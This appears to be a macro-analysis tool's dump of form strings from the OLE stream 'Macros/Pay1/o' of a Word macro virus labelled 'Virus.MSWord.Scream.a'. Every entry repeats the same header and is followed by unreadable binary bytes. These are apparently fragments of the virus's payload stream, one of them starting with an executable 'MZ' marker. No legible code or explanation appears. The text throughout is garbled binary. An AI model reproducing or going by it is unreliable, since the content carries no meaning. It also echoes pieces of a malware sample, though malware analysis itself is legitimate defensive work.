- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;ao��oq�Oz�WSYN��4td�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c#>q�L�2�y�3���ȹ��K6u�M��F�f�I�^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
av��nf
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
M;[�W����zN��?�u���kF	��=*�����T�Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�
wGL�Ø������WX]#z��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�c~�����\1����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
MZ>$8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�.����� 8��q���ck�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�mU����~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(?R�l�w�氒Zɘ��Wtw
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'��X�0 ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�S°|��]
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��,p��I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c.q�R]��'��g��d��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���G�&�%E5u�(s��;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z�Q��z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s�oR��z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�]k������17JZ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x­��5%-��
(�8c��cw��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�5x�W
J�;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 8Ӱ�����O���?^���]{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��۸���V][#b����=�ׯ�?���_F=�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�R/��5������яb�U�'���T�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��S�=���N!�gR4��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��DvM
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%�6��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�m�H�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>�5X٫e��"��Ŏc�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�-|��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s�����GQm�T�#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�t�=��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s�\nmC�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�L�=
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r��<T��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�?w-#������t�5����q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`�j�A�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�'	�JP{v���h��]D�8)e��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
de��Nv�Yg�e��,p23�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�/q����P�)^L�Vui�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�2��S�h�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���U��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
A����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�RM��1(���#�6nA
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��9�|�aQ@���r
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����=:*�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cͽG}C�n�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
) { {s�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�S�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
EǏ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�w�NNO4θS�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ɾ�k`������M.�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n?�֠����7<��$�O"q�PZҫ�f<�n�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

���]e
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ξ��a����*���+�e�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�p6�0l�?��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�'<v�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W8�_q�}F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%E�j�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�닳�ln-�4p�	��ҵ�.|�t� ��?�wԚJxZ�N��Ǵe��8(]U��&�zG;<�	+�TS�3��x�n8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����ѭhg�\h�KWѓ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J��b�h�<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�#g��j.�\�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7?2�6�rd��Z�o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�6@;�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���g�N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>�E=U-[a�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��O%J�x��t-��i�.���r�e5�&b�g�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9���k�Ϯ�ʉ}�G'G��1�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U`�JP�:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$�"�N41
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�H	֟J�OQ��SM)�&�J������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
㍁��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r]����Q�����:��(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ܠ���5~hJ��vTډ)���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� �C�R�������Ҽ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�>5b�R]�w��C�c��ԟ��Rpİ�d<��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�(��ِx
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�imCk�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T�-t1W1��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�x��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��<����s�"�{:�T[��8L[,nߍ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
͚ɳ���8i�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�M6�|�SQMA#�7��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���}J��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
vm2��Pih�-�,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n�F�=
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�3���#��_O�G
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�:D�ZM=M�';8�Y���W)�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&�#|o��f�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<���U�=����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����]�R��Oh4͒M�Q���pp;�.;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��aE�+2���	5�I����I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{�cwF
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��TEL��j�O
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�w �nvZ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��I��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:YQÕ�C��+�;�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Uf�KUξ�*��A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{�O�5X��{;��6�u5��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
# ��7'�B�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d�d��S���!YS�k2u�Yq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��)%�s���g
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
iӍ�_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
WL��Z��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��i��\%�s�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�+:>�Zl��Q�s�h��Ǜ�ݞ�8��F�9Y��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
¥(;��ٮEd��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�>�?ֵ^���k	d���`���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����Ϊ7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
YN�Z�u&������4�9�<��!E��l�R���K���=e�b�SF
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p�im@o�7��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�y]ܘ��;��P�F�)Y����q����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��n䠌�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�x��K�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
L�O�wX�~�p�d
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x3ۀs��'���C
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JUr_o�׳��+/���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�w�y�\��mz(��kL|�@G���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���;����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�l���U%�!�>_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6ZQ�hٯ_�-�־��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:��>~?r�_:6k��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�c����Ŏ�jO��ܩ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�k~�T{����C�ޤi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ޤi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7�%m~,Yo�UP�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Scream.a' - OLE stream: 'Macros/Pay1/o'
